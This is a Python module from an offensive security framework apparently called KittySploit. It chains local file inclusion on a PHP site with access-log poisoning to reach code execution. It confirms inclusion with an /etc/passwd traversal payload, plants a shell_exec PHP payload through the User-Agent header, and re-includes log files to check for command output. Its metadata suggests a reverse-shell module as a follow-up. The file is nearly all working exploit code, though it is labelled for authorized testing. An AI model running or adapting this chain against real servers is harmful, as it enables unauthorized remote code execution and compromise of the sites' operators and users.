#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
LFI log poisoning probe (authorized testing only).

Confirms a local file inclusion primitive, poisons a web server access log via
User-Agent injection, then re-includes the log path to detect PHP execution.
"""

from __future__ import annotations

import re
import urllib.parse
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, urlparse

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.module_result import finalize_http_scanner_run, target_base_url


class Module(Auxiliary, Http_client):

    __info__ = {
        "name": "LFI Log Poisoning Probe",
        "description": (
            "Chains LFI confirmation with access-log User-Agent poisoning and "
            "re-inclusion to validate log-poison → code execution paths."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "lfi", "log_poison", "rce", "php", "scanner"],
        "references": [
            "https://owasp.org/www-community/attacks/Path_Traversal",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "endpoints", "params"],
            "chain": {
                "consumes_capabilities": ["file_read", "lfi_param"],
                "produces_capabilities": [
                    {"capability": "poisoned_payload", "from_detail": "poison_payload"},
                    {"capability": "log_file_path", "from_detail": "log_path"},
                    {"capability": "rce", "from_detail": "rce_confirmed"},
                ],
                "option_bindings": {
                    "parameter": "lfi_param",
                    "log_path": "log_file_path",
                    "php_payload": "poisoned_payload",
                },
                "suggested_followups": [
                    "post/php/exploits/mail_sendmail_rce",
                    "post/shell/multi/manage/spawn_reverse_shell",
                ],
            },
        },
    }

    target = OptString("", "Target URL with LFI parameter", True)
    parameter = OptString("file", "LFI parameter name", False)
    log_path = OptString(
        "/var/log/apache2/access.log",
        "Log file to poison and include",
        False,
    )
    poison_path = OptString(
        "/",
        "Path that logs User-Agent (often / or the vulnerable script)",
        False,
    )
    php_payload = OptString(
        "<?php echo shell_exec('id'); ?>",
        "PHP payload injected into User-Agent",
        False,
        advanced=True,
    )
    lfi_probe = OptString(
        "../../../../etc/passwd",
        "Payload confirming LFI before poisoning",
        False,
        advanced=True,
    )

    _PASSWD_RE = re.compile(r"root:.*?:0:0:", re.MULTILINE)
    _ID_RE = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+", re.IGNORECASE)

    LOG_CANDIDATES = (
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/httpd/access_log",
        "/var/log/vsftpd.log",
        "/proc/self/environ",
    )

    def _opt(self, name: str, default: Any = "") -> str:
        value = getattr(self, name, default)
        if hasattr(value, "value"):
            return value.value
        return value

    def _param_name(self) -> str:
        raw = str(self._opt("target") or "").strip()
        if not raw:
            return str(self._opt("parameter") or "file")
        parsed = urlparse(raw)
        if parsed.query:
            params = parse_qsl(parsed.query, keep_blank_values=True)
            if params:
                return params[0][0]
        return str(self._opt("parameter") or "file")

    def _parse_lfi_target(self):
        raw = str(self._opt("target") or "").strip()
        parsed = urlparse(raw if "://" in raw else f"http://{raw}")
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        ssl = parsed.scheme == "https"
        base_path = parsed.path or "/"
        if not base_path.startswith("/"):
            base_path = f"/{base_path}"
        params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        return host, port, ssl, base_path, params

    def _apply_http_client_target(self):
        host, port, ssl, base_path, params = self._parse_lfi_target()
        if hasattr(self, "set_option"):
            self.set_option("target", host)
            self.set_option("port", int(port))
            self.set_option("ssl", ssl)
        else:
            self.target = host
            self.port = int(port)
            self.ssl = ssl
        self._lfi_base_path = base_path
        self._lfi_base_params = params
        self._configure_session()

    def _build_path(self, value: str) -> str:
        params = dict(getattr(self, "_lfi_base_params", {}) or {})
        params[self._param_name()] = value
        query = urllib.parse.urlencode(params, doseq=True)
        path = getattr(self, "_lfi_base_path", "/") or "/"
        return f"{path}?{query}" if query else path

    def _request(
        self,
        path: str,
        *,
        user_agent: Optional[str] = None,
        allow_redirects: bool = True,
    ):
        headers = {}
        if user_agent is not None:
            headers["User-Agent"] = user_agent
        return self.http_request(
            method="GET",
            path=path,
            headers=headers or None,
            allow_redirects=allow_redirects,
        )

    def _confirm_lfi(self) -> Dict[str, Any]:
        probe = str(self._opt("lfi_probe") or "../../../../etc/passwd")
        path = self._build_path(probe)
        response = self._request(path)
        body = (response.text or "") if response else ""
        if self._PASSWD_RE.search(body):
            return {"ok": True, "path": path, "probe": probe, "indicator": "etc/passwd"}
        if "root:" in body and "/bin/" in body:
            return {"ok": True, "path": path, "probe": probe, "indicator": "passwd-like"}
        return {"ok": False, "path": path, "probe": probe}

    def _readable_log(self, log_file: str) -> bool:
        path = self._build_path(log_file)
        response = self._request(path)
        body = (response.text or "") if response else ""
        if not body or len(body) < 8:
            return False
        markers = ("GET ", "POST ", "HTTP/", "Mozilla/", "127.0.0.1", "<?php")
        return any(marker in body for marker in markers)

    def _poison_log(self, log_file: str, payload: str) -> bool:
        poison = str(self._opt("poison_path") or "/").strip() or "/"
        if not poison.startswith("/"):
            poison = f"/{poison}"
        response = self._request(poison, user_agent=payload)
        return bool(response and response.status_code)

    def _trigger_include(self, log_file: str) -> Dict[str, Any]:
        path = self._build_path(log_file)
        response = self._request(path)
        body = (response.text or "") if response else ""
        status = int(response.status_code) if response else 0
        rce = bool(self._ID_RE.search(body))
        return {
            "path": path,
            "status_code": status,
            "body_len": len(body),
            "rce_confirmed": rce,
            "preview": body[:240],
        }

    def run(self):
        if not str(self._opt("target") or "").strip():
            print_error("Target URL is required")
            return False
        self._apply_http_client_target()

        print_status("Step 1/4 — confirm LFI primitive...")
        lfi = self._confirm_lfi()
        if not lfi.get("ok"):
            print_error("LFI not confirmed — aborting log poison chain")
            return finalize_http_scanner_run(
                self,
                [],
                title="LFI log poisoning",
                severity="high",
                category="lfi",
                findings_key="lfi_log_poison_findings",
            )

        print_success(f"LFI confirmed via {lfi.get('indicator')}")

        candidates: List[str] = []
        preferred = str(self._opt("log_path") or "").strip()
        if preferred:
            candidates.append(preferred)
        for item in self.LOG_CANDIDATES:
            if item not in candidates:
                candidates.append(item)

        print_status("Step 2/4 — select readable log path...")
        chosen_log = ""
        for log_file in candidates:
            if self._readable_log(log_file):
                chosen_log = log_file
                print_success(f"Readable log candidate: {log_file}")
                break
        if not chosen_log:
            chosen_log = preferred or candidates[0]
            print_warning(f"No log content verified — trying default: {chosen_log}")

        payload = str(self._opt("php_payload") or "").strip()
        print_status("Step 3/4 — poison log via User-Agent...")
        self._poison_log(chosen_log, payload)
        print_info(f"Poisoned via User-Agent on {self._opt('poison_path')}")

        print_status("Step 4/4 — re-include log path...")
        trigger = self._trigger_include(chosen_log)
        hits: List[Dict[str, Any]] = []
        if trigger.get("rce_confirmed"):
            print_success("Log poisoning appears to have executed PHP (id output detected)")
            hits.append({
                "vulnerable": True,
                "payload": chosen_log,
                "parameter": self._param_name(),
                "status_code": trigger.get("status_code"),
                "indicator": "log_poison_rce",
                "content_preview": trigger.get("preview"),
                "log_path": chosen_log,
                "poison_payload": payload,
                "poison_path": str(self._opt("poison_path") or "/"),
                "rce_confirmed": "yes",
                "lfi_probe": lfi.get("probe"),
            })
        else:
            print_warning("Log included but no command execution marker — may need different log or payload")
            hits.append({
                "vulnerable": True,
                "payload": chosen_log,
                "parameter": self._param_name(),
                "status_code": trigger.get("status_code"),
                "indicator": "log_poison_partial",
                "content_preview": trigger.get("preview"),
                "log_path": chosen_log,
                "poison_payload": payload,
                "poison_path": str(self._opt("poison_path") or "/"),
                "rce_confirmed": "no",
                "lfi_probe": lfi.get("probe"),
            })

        chain_extra = {}
        if hits:
            top = hits[-1]
            chain_extra = {
                k: str(top.get(k) or "")
                for k in ("log_path", "poison_payload", "rce_confirmed", "parameter")
                if top.get(k)
            }
            if chain_extra.get("parameter"):
                chain_extra["lfi_param"] = chain_extra["parameter"]

        return finalize_http_scanner_run(
            self,
            hits,
            title="LFI log poisoning",
            severity="critical" if trigger.get("rce_confirmed") else "high",
            category="lfi",
            findings_key="lfi_log_poison_findings",
            hit_mapper=lambda hit: {
                "payload": hit.get("payload"),
                "method": "GET",
                "request_url": target_base_url(self),
                "status_code": hit.get("status_code"),
                "evidence_snippet": hit.get("content_preview") or hit.get("indicator"),
                "indicators": [hit.get("indicator")] if hit.get("indicator") else [],
                "log_path": hit.get("log_path"),
                "poison_payload": hit.get("poison_payload"),
                "rce_confirmed": hit.get("rce_confirmed"),
            },
            vulnerability_info_extra=chain_extra,
        )
